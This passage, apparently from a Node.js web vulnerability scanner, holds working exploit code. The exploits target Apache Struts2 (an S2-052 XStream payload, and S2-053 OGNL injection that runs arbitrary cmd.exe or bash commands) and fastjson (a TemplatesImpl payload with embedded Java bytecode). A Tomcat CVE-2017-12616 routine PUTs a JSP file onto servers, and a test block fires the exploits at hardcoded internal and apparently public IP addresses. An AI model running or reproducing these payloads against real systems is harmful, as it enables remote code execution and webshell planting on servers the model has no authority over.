<jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command> <string>/Applications/Calculator.app/Contents/MacOS/Calculator</string> </command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> 
</entry> 
</map> 
https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-052
*/
function doStruts2_052(url)
{
	var szOldUrl = url;
	url = fnNotEnd(url);
	var s = "";
	var oR = fnOptHeader({method: 'GET',uri: url + "?redirectAction:" + encodeURIComponent(s)
		});
	oR.followAllRedirects = oR.followRedirect=true;
	request(oR,
    	function(e,r1,b)
    {
    	// var r = /\{\{([^\}]+)\}\}/gmi.exec(b.toString()),sR = r && r[1] || "";
    	// console.log(e || b);
    	if(!e)fnDoBody(e||b,"s2-052",szOldUrl);
    });
}
function doStruts2_053(url)
{
	var szOldUrl = url;
	this.name = this.name || "name";
	// console.log(this.name);
	url = fnNotEnd(url);
	var s = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','" + g_szCmdW + "'}:{'/bin/bash','-c','" + g_szCmd + "'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}";
	var oR = fnOptHeader({method: 'GET',uri: url + "?" + this.name + "=" + encodeURIComponent(s)
		});
	oR.followAllRedirects = oR.followRedirect=true;
	request(oR,
    	function(e,r1,b)
    {
    	// var r = /\{\{([^\}]+)\}\}/gmi.exec(b.toString()),sR = r && r[1] || "";
    	// console.log(e || b);
    	if(!e)fnDoBody(e||b,"s2-053",szOldUrl);
    });
}


// 
function fastjson(url, fnCbk)
{
	request(fnOptHeader(
		{method: 'POST',
		uri: url
		,body:'{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADIAqQcAAgEADXdob2FtaS9XaG9hbWkHAAQBABBqYXZhL2xhbmcvT2JqZWN0AQAIPGNsaW5pdD4BAAMoKVYBAARDb2RlCgABAAkMAAoABgEABnNldENtZAEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABjxpbml0PgoAAwAPDAANAAYBAAR0aGlzAQAPTHdob2FtaS9XaG9hbWk7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwgAFwEAB29zLm5hbWUKABkAGwcAGgEAEGphdmEvbGFuZy9TeXN0ZW0MABwAHQEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsKAB8AIQcAIAEAEGphdmEvbGFuZy9TdHJpbmcMACIAIwEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsIACUBAAd3aW5kb3dzCgAfACcMACgAKQEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaCAArAQAHY21kLmV4ZQgALQEAAi9jCAAvAQA8ZWNobyB3aG9hbWk6ICYmIHdob2FtaSAmJiBlY2hvIHB3ZDogJiYgZWNobyAlY2QlICYmIGVjaG8gZW5kCAAxAQAFbGludXgIADMBAAcvYmluL3NoCAA1AQACLWMIADcBACplY2hvIHdob2FtaTo7d2hvYW1pO2VjaG8gcHdkOjtwd2Q7ZWNobyBlbmQJABkAOQwAOgA7AQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07BwA9AQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIIAD8BAEbojrflj5bns7vnu5/lj4LmlbDlh7rplJnvvIzpnZ5XaW5kb3dz5oiWTGludXjvvIEg6I635Y+W5Yiw55qE5YC85Li677yaCgA8AEEMAA0AQgEAFShMamF2YS9sYW5nL1N0cmluZzspVgoAPABEDABFAEYBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsKADwASAwASQAjAQAIdG9TdHJpbmcKAEsATQcATAEAE2phdmEvaW8vUHJpbnRTdHJlYW0MAE4AQgEAB3ByaW50bG4KAAEAUAwAUQBSAQAFZG9DbWQBACcoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAJvcwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA2NtZAEABnJlc3VsdAEADVN0YWNrTWFwVGFibGUHABUHAFoBABZqYXZhL2xhbmcvU3RyaW5nQnVmZmVyCgBZAA8KAF0AXwcAXgEAEWphdmEvbGFuZy9SdW50aW1lDABgAGEBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7CgBdAGMMAGQAZQEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7CgBnAGkHAGgBABFqYXZhL2xhbmcvUHJvY2VzcwwAagBrAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwcAbQEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIKAGwAbwwADQBwAQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWBwByAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgoAcQB0DAANAHUBABMoTGphdmEvaW8vUmVhZGVyOylWCgAfAHcMAHgAeQEAB3ZhbHVlT2YBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nOwgAewEADmxpbmUuc2VwYXJhdG9yCgBZAH0MAEUAfgEALChMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWZmZXI7CgBxAIAMAIEAIwEACHJlYWRMaW5lCgCDAIUHAIQBABNqYXZhL2xhbmcvRXhjZXB0aW9uDACGAAYBAA9wcmludFN0YWNrVHJhY2UKAIgAigcAiQEAE2phdmEvaW8vSW5wdXRTdHJlYW0MAIsABgEABWNsb3NlCgBsAIoKAHEAigoAZwCPDACQAAYBAAdkZXN0cm95CgCSAIUHAJMBABNqYXZhL2lvL0lPRXhjZXB0aW9uCgBZAEgBAAJwcwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAANpc3IBABtMamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcjsBAAJicgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEAAmlzAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQACc2IBABhMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsBAAJydAEAE0xqYXZhL2xhbmcvUnVudGltZTsBAARsaW5lAQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwcApgEAE2phdmEvbGFuZy9UaHJvd2FibGUBAApTb3VyY2VGaWxlAQALV2hvYW1pLmphdmEAIQABAAMAAAAAAAUACAAFAAYAAQAHAAAAKAAAAAAAAAAEuAAIsQAAAAIACwAAAAoAAgAAAA8AAwAQAAwAAAACAAAAAQANAAYAAQAHAAAALwABAAEAAAAFKrcADrEAAAACAAsAAAAGAAEAAAAMAAwAAAAMAAEAAAAFABAAEQAAAAkAEgATAAEABwAAADIAAAABAAAABLgACLEAAAACAAsAAAAKAAIAAAATAAMAFAAMAAAADAABAAAABAAUABUAAAAJAAoABgABAAcAAAD9AAQAAwAAAHASFrgAGLYAHksGvQAfTCrGAB4qEiS2ACaZABUrAxIqUysEEixTKwUSLlOnADkqxgAeKhIwtgAmmQAVKwMSMlMrBBI0UysFEjZTpwAasgA4uwA8WRI+twBAKrYAQ7YAR7YASrEruABPTbIAOCy2AEqxAAAAAwALAAAAQgAQAAAAGgAJABsADgAcABsAHgAgAB8AJQAgACoAIQA6ACMAPwAkAEQAJQBJACYATAAnAGIAKABjACoAaAArAG8ALAAMAAAAIAADAAkAZwBTAFQAAAAOAGIAVQAVAAEAaAAIAFYAVAACAFcAAAANAAP9AC0HAB8HAFgeFgAJAFEAUgABAAcAAAMaAAQACgAAAP0BTAFNAU4BOgS7AFlZtwBbOgW4AFw6BhkGKrYAYkwrtgBmOgS7AGxZGQS3AG5NuwBxWSy3AHNOpwAgGQW7ADxZGQe4AHa3AEASergAGLYAQ7YAR7YAfFcttgB/WToHx//cpwBqOgYZBrYAghkExgAIGQS2AIcsxgAHLLYAjC3GAActtgCNK8YAcSu2AI6nAGo6CRkJtgCRpwBgOggZBMYACBkEtgCHLMYAByy2AIwtxgAHLbYAjSvGABErtgCOpwAKOgkZCbYAkRkIvxkExgAIGQS2AIcsxgAHLLYAjC3GAActtgCNK8YAESu2AI6nAAo6CRkJtgCRGQW2AJSwAAUAEgBhAGQAgwBrAI0AkACSABIAawCaAAAAnAC+AMEAkgDLAO0A8ACSAAMACwAAAMIAMAAAADQAAgA1AAQANgAGADcACQA4ABIAOgAXADsAHgA8ACQAPQAuAD4ANwBAADoAQQBXAEAAYQBDAGYARABrAEcAcABIAHUASQB5AEoAfQBLAIEATACFAE4AiQBPAI0AUACSAFEAmgBFAJwARwChAEgApgBJAKoASgCuAEsAsgBMALYATgC6AE8AvgBQAMMAUQDIAFMAywBHANAASADVAEkA2QBKAN0ASwDhAEwA5QBOAOkATwDtAFAA8gBRAPcAVAAMAAAAhAANAAAA/QBVABUAAAACAPsAlQCWAAEABAD5AJcAmAACAAYA9wCZAJoAAwAJAPQAmwCcAAQAEgDrAJ0AngAFABcASgCfAKAABgA6AB0AoQBUAAcAXgADAKEAVAAHAGYABQCiAKMABgCSAAUAogCkAAkAwwAFAKIApAAJAPIABQCiAKQACQBXAAAAkQAT/wA6AAgHAFgHAGcHAGwHAHEHAIgHAFkHAF0HAB8AAPoAHP8ADAAGBwBYBwBnBwBsBwBxBwCIBwBZAAEHAIMQBwdKBwCSSQcApf8ACwAJBwBYBwBnBwBsBwBxBwCIBwBZAAAHAKUAAAcHSgcAkgb/AAIABgcAWAcAZwcAbAcAcQcAiAcAWQAACQcHSgcAkgYAAQCnAAAAAgCo"],"_name":"a.b","_tfactory":{ },"_outputProperties":{ },"_version":"1.0","allowedProtocols":"all"}'
	    ,headers:
	    {
	    	"User-Agent": g_szUa,
	    	"Content-Type":"xml/JSON"
	    }})
	  , function (error, response, body){
	  		//console.log(error || body);
	  		if(body)
	  		{
	  			fnDoBody(body,"fastjson");
	  		}
	    }
	  );
}

/*
CVE-2017-12616 poc
1、/conf/web.xml
 <init-param>
            <param-name>readonly</param-name>
            <param-value>false</param-value>
        </init-param>
2、http://............../
curl -X PUT "http://127.0.0.1:8080/123.jsp/" -d '<%out.println("test");%>'
http://127.0.0.1:8080/123.jsp
*/
var szCode = fs.readFileSync(__dirname + "/bak.jsp").toString();
function fnMyPut(url)
{
	url = url.substr(0, url.lastIndexOf('/') + 1);
	var a = ["bak.jsp%20","bak.jsp/","bak.jsp%00","bak.jsp"];
	var fnPt = function(u)
	{
		request.put({"uri":u,"body":szCode},function(e,r,b)
		{
			if(e);//console.log(e);
			// console.log([u,r.statusCode,r.headers["location"],e||b]);
			else if(r && (201 == r.statusCode || 204 == r.statusCode))
			{
				var oT = g_oRst["tomcat"] || {};
				oT["CVE-2017-12616"] = "发现高危put CVE-2017-12616漏洞,可访" + u + "问进行测试";
				console.log(oT["CVE-2017-12616"]);
				g_oRst["tomcat"] = oT;
			}
		});
	};
	for(var k in a)
		fnPt(url + a[k]);	
}

// https://github.com/Medicean/VulApps/tree/master/s/struts2
function fnTestStruts2(szUrl2, obj)
{
	var a = [doStruts2_001,doStruts2_007,doStruts2_009,doStruts2_012,doStruts2_013,doStruts2_029,doStruts2_048,doStruts2_053], fnGetCpy = function()
	{
		var o = {name:null};
		if(!obj)return o;
		for(var k in obj)o[k] = obj[k];
		return o;
	};
	
	if(obj)
	for(var k in a)
	{
		a[k].call(fnGetCpy(),szUrl2);
	}

	a = [doStruts2_005,doStruts2_008,doStruts2_015,doStruts2_016,doStruts2_019,doStruts2_032,doStruts2_033,doStruts2_037,doStruts2_DevMode,doStruts2_045,doStruts2_046];
	if(!obj)
	for(var k in a)
	{
		a[k](szUrl2);
	}
	// doStruts2_020(g_szUrl);
	// doStruts2_052(szUrl2);
	if(-1 == szUrl2.indexOf("login.jsp"))
		fnTestStruts2(szUrl2 + "/login.jsp",obj);
	// if(!(/\/$/g.test(szUrl2)))fnTestStruts2(szUrl2 + "/");
}

if(!program.test && 0 < a.length && g_szUrl)
{
	if(program.struts2)
	{
		if(/^\d\d\d$/g.test(program.struts2))
		{
			eval("doStruts2_" + program.struts2 + "(g_szUrl)");
		}
	}
	else
	{
		getIps(g_szUrl);
		//*
		testWeblogic(g_szUrl);
		fnMyPut(g_szUrl);
		fnTestStruts2(g_szUrl)
		elasticsearch(g_szUrl);
		
		// fastjson(g_szUrl);
		
		// 测试method和伪造host
		fnTestAll();
		if(program.menu)fnCheckTa3(g_szUrl,"string" != typeof(program.menu) && "./urls/ta3menu.txt" || program.menu,"一些常见、可能存在风险url检测",'ta3menu');
		if(program.webshell)fnCheckTa3(g_szUrl,"string" != typeof(program.webshell) && "./urls/webshell.txt" || program.webshell, "webshell、木马",'webshell');
		////////////////////*/
	}
}

process.on('exit', (code) => 
{
	g_oRst.url = g_szUrl;
	g_oRst.date = require('moment')(new Date().getTime()).format('YYYY-MM-DD HH:mm:ss');
	var ss = JSON.stringify(g_oRst,null,' '),
	    md5 = require('md5');
	console.log(ss);
	fs.writeFileSync("./data/" + md5(g_szUrl),ss);
});

if(program.test)
{
	// fnMyPut('http://192.168.17.96:8081/manager/');
	/*
	console.log("开始内网测试");
	var a = fs.readFileSync("/Users/xiatian/C/targets.txt").toString().split(/\n/);
	for(var i in a)
		fnMyPut(a[i].trim());*/
	//*
	checkWeblogicT3("125.71.203.122","9088");
	doStruts2_016.call({name:null},"http://192.168.10.216:8088/S2-016/default.action");
 	doStruts2_005.call({name:null},"http://192.168.10.216:8088/S2-005/example/HelloWorld.action");
	doStruts2_032.call({name:null},"http://192.168.10.216:8088/s2-032/memoindex.action");
	doStruts2_015.call({name:null},"http://101.89.63.203:2001/jnrst/");
	/////////////*/
	/**
	doStruts2_009(g_szUrl);
	
	// doStruts2_020(g_szUrl);
	
	doStruts2_033(g_szUrl);
	doStruts2_037(g_szUrl);
	doStruts2_DevMode(g_szUrl);
	doStruts2_045(g_szUrl);
	// 文件上传测试
	doStruts2_046(g_szUrl);
	doStruts2_048(g_szUrl);
	//*/
	//*
	doStruts2_001.call({name:null},"http://192.168.10.216:8088/S2-001/login.action");
	doStruts2_007.call({name:null},"http://192.168.10.216:8088/S2-007/user.action");
	doStruts2_008.call({name:null},"http://192.168.10.216:8088/S2-008/devmode.action");
	doStruts2_012.call({name:null},"http://192.168.10.216:8088/S2-012/user.action");
	doStruts2_013.call({name:null},"http://192.168.10.216:8088/S2-013/link.action");
	doStruts2_015.call({name:null},"http://192.168.10.216:8088/S2-015/");
	doStruts2_016.call({name:null},"http://192.168.10.216:8088/S2-016/default.action");
	doStruts2_019.call({name:null},"http://192.168.10.216:8088/S2-019/example/HelloWorld.action");
	doStruts2_029.call({name:null},"http://192.168.10.216:8088/S2-029/default.action");
	
	doStruts2_046.call({name:null},"http://192.168.10.216:8082/s2-046/");
	doStruts2_048.call({name:null},"http://192.168.10.216:8082/s2-048/integration/saveGangster.action");
	doStruts2_053.call({name:null},"http://192.168.10.216:8082/s2-053/");
	///////////*/
}
module.exports = {"doStruts2_001":doStruts2_001};
var kk = this;
for(var k in kk)
{
	if("function" == typeof kk[k])
		console.log(k);
	// else console.log(kk[k]);
}

/*
var a = fs.readFileSync("./nwTomcat.txt").toString().trim().split("\n");
for(var k in a)
{
	var s = "http://" + a[k] + "manager/";
	console.log(s);
	fnMyPut(s);
}
/////////////*/
/*
s2-045
node checkUrl.js http://192.168.24.67:22245/
s2-048
node checkUrl.js http://192.168.24.67:22244/integration/saveGangster.action
*/